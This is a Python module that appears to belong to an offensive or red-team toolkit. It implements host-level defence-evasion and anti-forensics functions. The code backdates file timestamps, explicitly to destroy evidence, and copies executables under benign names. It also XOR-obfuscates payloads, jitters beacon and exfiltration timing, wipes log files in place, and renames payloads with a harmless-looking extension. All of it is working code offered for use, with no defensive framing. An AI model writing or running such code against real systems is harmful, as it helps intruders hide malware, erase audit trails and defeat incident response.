"""quantum.ops.evasion — real evasion techniques (local, host-level).

Working implementations, not placeholders:

- timestomp: backdate file mtimes/atimes (evidence destruction)
- masquerade: copy an executable under a benign process/file name
- xor_cipher: deterministic payload obfuscation (see also polymorph)
- jitter_sleep: humanized timing for beacon/exfil pacing
- purge_logs: clear a log file's contents while keeping the inode

All functions are JSON-safe (return dicts, never raise) and need only
the local filesystem — "needs a live target" applies to using them on
an engagement host, not to the mechanics themselves.
"""
from __future__ import annotations

import os
import random
import shutil
import time
from datetime import datetime, timedelta, timezone


def timestomp(path, ref=None, days_back=None) -> dict:
    """Set a file's atime/mtime (default: match `ref`, else backdate
    `days_back` days, else mimic a typical OS install date)."""
    try:
        if not os.path.isfile(path):
            return {"ok": False, "error": "file not found: %s" % path}
        if ref and os.path.isfile(ref):
            st = os.stat(ref)
            times = (st.st_atime, st.st_mtime)
        elif days_back:
            base = time.time() - float(days_back) * 86400
            times = (base, base)
        else:
            # blend in with install-time files: ~1-3 years back
            back = random.randint(365, 1095)
            base = time.time() - back * 86400
            times = (base, base)
        os.utime(path, times)
        st = os.stat(path)
        return {"ok": True, "path": path,
                "mtime": datetime.fromtimestamp(
                    st.st_mtime, tz=timezone.utc).isoformat(),
                "atime": datetime.fromtimestamp(
                    st.st_atime, tz=timezone.utc).isoformat()}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def masquerade(src, name, dest_dir=None, ext=None) -> dict:
    """Copy an executable to a benign-looking name (masquerading)."""
    try:
        if not os.path.isfile(src):
            return {"ok": False, "error": "source not found: %s" % src}
        dest_dir = dest_dir or os.path.dirname(os.path.abspath(src))
        os.makedirs(dest_dir, exist_ok=True)
        final = os.path.join(dest_dir, name + (ext or ""))
        shutil.copy2(src, final)
        # a real masquerade also fixes the timestamps
        timestomp(final)
        return {"ok": True, "source": src, "masqueraded": final,
                "size": os.path.getsize(final)}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def xor_cipher(data, key) -> bytes:
    """Deterministic XOR stream cipher (raw bytes in/out)."""
    if isinstance(key, str):
        key = key.encode()
    if not key:
        raise ValueError("empty key")
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def jitter_sleep(base=5.0, spread=0.3, cap=60.0) -> dict:
    """Sleep base*(1 +/- spread) seconds — humanized beacon pacing.
    Returns the slept duration without raising."""
    try:
        import time as _t
        low = max(0.1, base * (1 - spread))
        high = base * (1 + spread)
        dur = min(random.uniform(low, high), cap)
        _t.sleep(dur)
        return {"ok": True, "slept": round(dur, 3)}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}


def purge_logs(path) -> dict:
    """Truncate a log file in place (keeps inode + permissions)."""
    try:
        if not os.path.isfile(path):
            return {"ok": False, "error": "log not found: %s" % path}
        size = os.path.getsize(path)
        with open(path, "w"):
            pass
        return {"ok": True, "path": path, "bytes_removed": size}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def hide_in_plain_sight(path, cover_ext=".log") -> dict:
    """Rename payload with a boring extension (delivery evasion)."""
    try:
        if not os.path.isfile(path):
            return {"ok": False, "error": "file not found: %s" % path}
        root, _ = os.path.splitext(path)
        dest = root + cover_ext
        os.replace(path, dest)
        return {"ok": True, "path": dest}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def expiry_days(date_iso, days=90) -> dict:
    """Has a timestamp (ISO) aged out of a default retention window?"""
    try:
        dt = datetime.fromisoformat(str(date_iso).replace("Z", "+00:00"))
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        age = datetime.now(timezone.utc) - dt
        return {"ok": True, "age_days": round(age.total_seconds() / 86400, 1),
                "expired": age > timedelta(days=days)}
    except (ValueError, TypeError) as exc:
        return {"ok": False, "error": str(exc)}
